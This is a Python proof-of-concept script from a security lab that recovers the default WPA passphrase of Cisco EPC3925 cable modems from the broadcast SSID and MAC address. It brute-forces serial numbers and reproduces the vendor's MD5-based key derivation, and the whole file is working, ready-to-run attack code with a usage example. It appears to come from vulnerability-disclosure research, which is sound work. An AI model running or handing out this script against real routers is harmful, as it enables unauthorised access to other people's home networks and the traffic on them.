#
# Cisco EPC3925 default passphrase generator POC
#   Search-lab ltd.
#
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
#
# Usage:
#    cisco_psk.py SSID, MAC
# Result:
#    default serial, SSID, default PSK
#
# More than one result is possible!
#
# Example (based on http://www.upc.hu/content/dam/www-upc-hu/img/cc-old/wifi_datas.png)
#   cisco_psk.py 538420 e4:48:c7:88:7f:58
# result:
#   200324188 -> AADENWIB
#   201461780 -> QFMNTAOQ
#   204455244 -> KEFWMZIT
#   ...
#   241989474 -> EJMNNGBY  !!!
#   ...

import sys
import binascii
import hashlib
import struct

def getVal(v0):
    v0 = ord(v0)
    return ((((v0<<1)+v0)<<3)+v0)>>6

def genSSID_PSK(mac, serial):
    m = hashlib.md5('%s-%s'%(mac,serial)).digest()
    ssid = '%02u%02u%02u'%(getVal(m[0]), getVal(m[1]), getVal(m[2]))
    psk = ''
    for i in range(8):
        v0 = ord(m[3+i])
        psk += chr(0x41 + (((((v0<<1)+v0)<<2)+v0)>>7))
    return (ssid, psk)

def genSSID(mac, serial):
    s = '%s-%s'%(mac,serial)
    mres = hashlib.md5(s).digest()
    v0 = ord(mres[0])
    v1 = ((((v0<<1)+v0)<<3)+v0)>>6
    v0 = ord(mres[1])
    v2 = ((((v0<<1)+v0)<<3)+v0)>>6
    v0 = ord(mres[2])
    v3 = ((((v0<<1)+v0)<<3)+v0)>>6
    ssid = '%02u%02u%02u'%(v1, v2, v3)

    psk = ''
    for i in range(8):
        v0 = ord(mres[3+i])
        v3 = ((((v0<<1)+v0)<<2)+v0)>>7
        psk += chr(v3+0x41)

    return (ssid, psk)

if (len(sys.argv) < 3):
    print 'Usage: cisco_psk.py SSID MAC'
    print '  Example: cisco_psk.py xxxxxx bc:c8:10:xx:xx:xx'
    sys.exit(0)

test_ssid = sys.argv[1]
mac = sys.argv[2]

start = 200000000
for i in xrange(60000000):
    serial = '%d'%(i+start)
    (ssid, psk) = genSSID(mac, serial)
    if (ssid == test_ssid):
        print '%s -> %s'%(serial, psk)